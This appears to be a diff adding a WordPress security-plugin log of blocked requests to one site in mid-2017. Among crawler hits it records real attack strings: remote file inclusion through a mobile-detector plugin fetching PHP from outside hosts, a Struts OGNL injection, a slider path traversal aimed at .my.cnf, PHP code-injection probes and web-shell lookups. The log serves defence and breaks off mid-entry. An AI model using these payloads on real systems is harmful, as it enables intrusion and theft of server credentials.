+[403 GET Request: June 15, 2017 - 2:50 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.18
+Host Name: 180.97.215.18
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 18, 2017 - 4:10 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /code-samples
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 18, 2017 - 11:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.254.62.34
+Host Name: s03.speicheranbieter.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/class-wp-common.php
+REQUEST_URI: /wp-includes/class-wp-common.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 18, 2017 - 3:13 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.102
+Host Name: 46.229.164.102
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 POST Request: June 20, 2017 - 4:52 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class.wp-tmps.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: xxeerr44=die%28pi%28%29%2A42%29%3B
+
+[403 GET Request: June 20, 2017 - 12:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 185.41.154.231
+Host Name: vps-22781.fhnet.fr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 POST Request: June 20, 2017 - 2:15 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.110.202.110
+Host Name: server.gebsoftware.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: whatsmycut.com
+REQUEST_URI: /wp-includes/temp.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
+REQUEST BODY: coco=print%28base64_encode%2854435934572307542903%29%29%3B&fuckyou4321=print%28base64_encode%2834534645457%29%29%3B&sam=cHJpbnQgYmFzZTY0X2VuY29kZSgyMzM0NTY1NDY1NDc1NDcpOw%3D%3D&sss=print%28base64_encode%28123987345%29%29%3B
+
+[403 GET Request: June 20, 2017 - 2:19 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 185.41.154.231
+Host Name: vps-22781.fhnet.fr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 22, 2017 - 1:31 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 87.98.217.57
+Host Name: ns3121343.ip-87-98-217.eu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)
+
+[403 GET Request: June 22, 2017 - 3:04 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/theme-compat/myker.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 GET Request: June 22, 2017 - 7:00 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 83.149.126.98
+Host Name: 83.149.126.98
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)
+
+[403 GET Request: June 24, 2017 - 10:36 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.183.96.47
+Host Name: 185.183.96.47
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
+
+[403 GET Request: June 24, 2017 - 3:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.184.250.231
+Host Name: 231.250.184.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 24, 2017 - 4:59 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.7.214.171
+Host Name: 185.7.214.171
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-includes/wp-media.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31
+
+[403 GET Request: June 24, 2017 - 5:54 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.184.250.231
+Host Name: 231.250.184.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 26, 2017 - 6:04 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 119.28.21.54
+Host Name: 119.28.21.54
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?redirect:$%7B%23matt%3d%20%23context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),%23matt.setContentType(\'text/plain\'),%23matt.getWriter().println%20(\'successsuccess\'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0
+
+[403 GET Request: June 26, 2017 - 11:18 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 98.143.36.24
+Host Name: 98.143.36.24
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
+
+[403 POST Request: June 27, 2017 - 12:17 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 103.242.217.178
+Host Name: angeldropsltd.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/class.wp-tmps.php
+REQUEST_URI: /wp-includes/class.wp-tmps.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+REQUEST BODY: xxeerr44=die(md5(1));
+
+[403 GET Request: June 27, 2017 - 12:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 27, 2017 - 12:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 27, 2017 - 12:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 27, 2017 - 12:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 27, 2017 - 12:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 28, 2017 - 7:43 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 92.222.92.136
+Host Name: 136.ip-92-222-92.eu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: whatsmycut.com
+REQUEST_URI: /?15=print(md5(32423));exit();
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
+
+[403 GET Request: June 28, 2017 - 7:45 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 92.222.92.136
+Host Name: 136.ip-92-222-92.eu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: whatsmycut.com
+REQUEST_URI: /?15=print(md5(32423));exit();
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
+
+[403 GET Request: June 28, 2017 - 11:54 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 31.202.216.197
+Host Name: 31.202.216.197.format-tv.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class.wp.php?ok
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1
+
+[403 GET Request: June 29, 2017 - 9:52 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 192.151.149.10
+Host Name: 192.151.149.10
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 30, 2017 - 4:14 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 79.143.179.76
+Host Name: vmi123163.contaboserver.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 30, 2017 - 4:50 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 79.143.179.76
+Host Name: vmi123163.contaboserver.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 1, 2017 - 6:52 am]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.187.198.105
+Host Name: 105.198.187.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 1, 2017 - 8:58 am]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.187.198.105
+Host Name: 105.198.187.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 1, 2017 - 4:25 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 209.90.225.226
+Host Name: m226.themothership.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/wp-includes/x.php
+REQUEST_URI: /wp-includes/x.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
+
+[403 GET Request: July 3, 2017 - 1:22 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.210.155.153
+Host Name: 104.210.155.153
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 5, 2017 - 9:16 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/mvp.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 POST Request: July 6, 2017 - 1:43 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/indes.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: BPS Security Log option set to: Do Not Log POST Request Body Data
+
+[403 GET Request: July 6, 2017 - 11:54 am]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 6, 2017 - 1:24 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 37.1.204.92
